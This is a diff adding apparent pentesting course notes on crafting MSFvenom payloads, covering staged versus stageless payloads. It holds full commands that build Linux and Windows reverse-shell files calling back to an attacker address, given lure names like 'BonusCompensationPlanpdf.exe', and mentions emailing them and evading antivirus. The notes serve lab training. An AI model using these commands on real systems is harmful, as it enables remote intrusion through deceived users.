@@ -599,3 +599,119 @@ Use `dir` to print out the files in the Documents folder to find the name of the
 
 And here our flag is the file `staffsalaries.txt`.
 
+
+
+## Crafting Payloads with MSFvenom
+
+
+
+- Automated attacks in Metasploit **needs network access** to a vulnerable machine
+
+- MSFvenom can be used to craft a payload and send it via email or other social engineering techniques to get the user to execute the file
+
+- MSFvenom can **encrypt and encode** your payload to bypass common anti-virus detection signatures.
+
+
+
+### Crafting Payloads with MSFvenom
+
+List the available payloads:
+
+```shell-session
+msfvenom -l payloads
+```
+
+
+
+### Staged vs. Stageless Payloads
+
+Staged payloads
+
+- Sending more **components** in our attack
+
+- Setting a stage
+
+- liunx/x86/shell/reverse_tcp
+  
+  - First initialize payload with executing on target
+  
+  - It then calls back to out **attack box** to download the remainder of the exploit
+
+Stageless paylaods
+
+- Does not have a stage
+
+- Better for evading
+  
+  - Less traffic passing over the network to execute the payload
+
+### 
+
+### Building A Stageless Payload
+
+Build it 
+
+```shellsession
+DanielBoye@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+```
+
+Break down the command
+
+
+
+Call MSFvenom
+
+```shell-session
+msfvenom
+```
+
+Create a payload
+
+```shell-session
+-p
+```
+
+Choosing payload (based on Architechture)
+
+```shell-session
+linux/x64/shell_reverse_tcp 
+```
+
+Callback address
+
+```shell-session
+LHOST=10.10.14.113 LPORT=443 
+```
+
+Format of the payload
+
+```shell-session
+-f elf 
+```
+
+Output the file
+
+```shell-session
+> createbackup.elf
+```
+
+### Building a simple Stageless Payload for a Windows system
+
+Make it an .exe
+
+```shellsession
+DanielBoye@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+
